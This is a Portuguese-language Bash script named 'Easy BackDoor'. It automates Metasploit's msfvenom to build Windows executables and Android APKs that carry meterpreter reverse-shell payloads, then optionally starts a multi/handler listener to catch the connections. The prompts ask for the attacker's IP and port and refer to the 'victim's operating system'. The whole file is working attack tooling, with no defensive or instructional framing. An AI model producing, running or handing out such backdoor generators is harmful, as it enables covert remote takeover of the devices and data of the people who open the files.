#!/bin/bash

metasploit='/usr/share/metasploit-framework'
figlet='/usr/share/figlet'
root=$(id -u)
pasta='dados'


figletEasyBackDoorTitle(){
    echo -e "\033[00;34m"
    clear
    figlet "Easy BackDoor"
    echo
    echo
    echo
}

EasyBackDoorTitle(){
    clear
    echo -e "\033[00;33m+---------------+"
    echo -e "| \033[00;34mEasy BackDoor \033[00;33m|"
    echo -e "+---------------+"
    echo
    echo
    echo
}
condFiglet(){
    if [ -e $figlet ];then
        figletEasyBackDoorTitle
    else
        EasyBackDoorTitle
    fi
}

IPPORT(){
    echo -e "\033[00;36m"
    read -p "QUAL É O IP DO HOST QUE VAI RECEBER A CONEXÃO? " ip
    read -p "QUAL É A PORTA DA CONEXÃO?  " port
    read -p "QUAL SERÁ O NOME DO ARQUIVO? " arquivo
}

windows(){
    clear
    condFiglet
    echo -e "\033[00;31mESCOLHA O PAYLOAD:"
    sleep 0.3
    echo
    echo -e "\033[01;31m[1} \033[00;31mwindows/meterpreter/reverse_tcp"
    sleep 0.3
    echo -e "\033[01;31m[2} \033[00;31mwindows/meterpreter/reverse_http"
    sleep 0.3
    echo -e "\033[01;31m[3} \033[00;31mwindows/meterpreter/reverse_tcp_dns"
    sleep 0.3
    echo
    echo -ne "\033[00;31m> \033[01;31m" ; read payloadloadW

    case $payloadloadW in

        1)
        IPPORT
        echo
        echo -e "\033[01;36mA BACK DOOR ESTA SENDO CRIADA..."
        echo
        msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -f exe > $arquivo.exe 2>/dev/null
        payload='windows/meterpreter/reverse_tcp';;

        2)
        IPPORT
        echo
        echo -e "\033[01;36mA BACK DOOR ESTA SENDO CRIADA..."
        echo
        msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > $arquivo.exe 2>/dev/null
        payload='windows/meterpreter/reverse_https';;

        3)
        IPPORT
        echo
        echo -e "\033[01;36mA BACK DOOR ESTA SENDO CRIADA..."
        echo
        msfvenom -p windows/meterpreter/reverse_tcp_dns LHOST=$ip LPORT=$port -f exe > $arquivo.exe 2>/dev/null
        payload='windows/meterpreter/reverse_tcp_dns';;

        *)
        echo "\033[01;36mPAYLOAD INVÁLIDO!" ; sleep 1 ; exit;;

    esac
}

android(){
    clear
    condFiglet
    echo -e "\033[00;31mESCOLHA O PAYLOAD:"
    sleep 0.3
    echo
    echo -e "\033[01;31m[1} \033[00;31mandroid/meterpreter/reverse_tcp"
    sleep 0.3
    echo -e "\033[01;31m[2} \033[00;31mandroid/meterpreter/reverse_https"
    sleep 0.3
    echo
        echo -ne "\033[00;31m> \033[01;31m" ; read payloadloadA

    case $payloadloadA in

        1)
        IPPORT
        echo
        echo -e "\033[01;36mA BACK DOOR ESTA SENDO CRIADA..."
        echo
        msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > $arquivo.apk 2>/dev/null
        payload='android/meterpreter/reverse_tcp';;

        2)
        IPPORT
        echo
        echo -e "\033[01;36mA BACK DOOR ESTA SENDO CRIADA..."
        echo
        msfvenom -p android/meterpreter/reverse_https LHOST=$ip LPORT=$port R > $arquivo.apk 2>/dev/null
        payload='android/meterpreter/reverse_https';;

        *)
        echo "\033[01;36mPAYLOAD INVÁLIDO!" ; sleep 1 ; exit;;

    esac
}












# MAIN

#condições de execução:

if [ $root != 0 ];then
    echo -e "\033[01;31mVOCÊ NÃO ESTA LOGADO COMO ROOT!"
    echo -e "\033[01;31mEXECUTE O SCRIPT COM 'sudo' OU ENTRE COMO SUPER USUARIO: 'su'"
    sleep 3
    exit
fi



clear
echo -ne "\033[00;33mPROCURANDO \033[01;34mMETASPLOIT FRAMEWORK" ; sleep 0.5 ; echo -ne "\033[00;33m." ; sleep 0.5 ; echo -ne "." ; sleep 0.5 ; echo -ne "." ; sleep 0.5


if [ -e $metasploit ];then
    clear
    echo -e "\033[01;34mMETASPLOIT \033[01;33mENCONTRADO." ; sleep 1
    clear
else
    clear
    echo -e "\033[01;34mMETASPLOIT \033[01;31mNÃO FOI ENCONTRADO!" ; sleep 1
    exit
fi

if [ -e $pasta ];then
    cd dados
else
    mkdir dados && cd dados
fi



# menu & efeitos visuais

if [ -e $figlet ];then
    echo -e "\033[00;34m"
    clear
    figlet "E"
    sleep 0.1
    clear
    figlet "Ea"
    sleep 0.1
    clear
    figlet "Eas"
    sleep 0.1
    clear
    figlet "Easy"
    sleep 0.1
    clear
    figlet "Easy "
    sleep 0.1
    clear
    figlet "Easy B"
    sleep 0.1
    clear
    figlet "Easy Ba"
    sleep 0.1
    clear
    figlet "Easy Bac"
    sleep 0.1
    clear
    figlet "Easy Back"
    sleep 0.1
    clear
    figlet "Easy BackD"
    sleep 0.1
    clear
    figlet "Easy BackD"
    sleep 0.1
    clear
    figlet "Easy BackDo"
    sleep 0.1
    clear
    figlet "Easy BackDoo"
    sleep 0.1
    clear
    figlet "Easy BackDoor"
    sleep 0.2
    echo -e "         \033[01;32mby \033[00;00;00m \033[00;34m@\033[00;00;00m\033[01;30mArk-\033[00;00;00m\033[05;31mc3"
else
    echo -e "\033[00;33m+---------------+"
    echo -e "| \033[01;34mEasy BackDoor \033[00;33m|"
    echo -e "+---------------+"
    sleep 0.2
    echo -e "   \033[01;32mby \033[00;00;00m \033[00;34m@\033[00;00;00m\033[01;30mArk-\033[00;00;00m\033[05;31mc3"
    sleep 0.5
fi

echo
echo
echo
sleep 0.3
echo -e "\033[00;31mESCOLHA O SISTEMA OPERACIONAL DA VÍTIMA:"
echo
echo
sleep 0.3
echo -e "\033[00;31m1 } Windows"
echo
sleep 0.3
echo -e "2 } Android"
echo
echo -e "\033[01;33m"
sleep 0.3
echo -ne "\033[01;33m> \033[00;33m" ; read OS

case $OS in

    1)
    windows;;

    2)
    android;;

    *)
    echo -e "\033[01;31mSISTEMA OPERACIONA INVÁLIDO!" ; sleep 1 ; exit;;

esac

echo -e "\033[00;33mO ARQUIVO  (\033[00;31mBACK DOOR {$arquivo}\033[00;33m) FOI SALVO NA PASTA '\033[01;33mdados\033[00;33m'."
echo
read -p "DESEJA CONFIGURAR O HANDLER AUTOMATICAMNTE E DEIXA-LO ESCUTANDO?[s/n] " resposta
echo
echo
if [ $resposta = "s" ];then
    clear
    echo -e "ABRINDO \033[01;34mMSFCONSOLE\033[00;33m..."
    msfconsole -q -x "use multi/handler ; set PAYLOAD $payload ; set LHOST $ip ; set LPORT $port ; exploit"
elif [ $resposta = "n" ];then
    echo -e "OK!" ; sleep 0.2 ; exit
else
    echo -ne "\033[00;31mOPSÃO INVÁLIDA " ; sleep 0.2 ; echo -e "SAINDO DO SCRIPT" ; sleep 0.2 ; exit
fi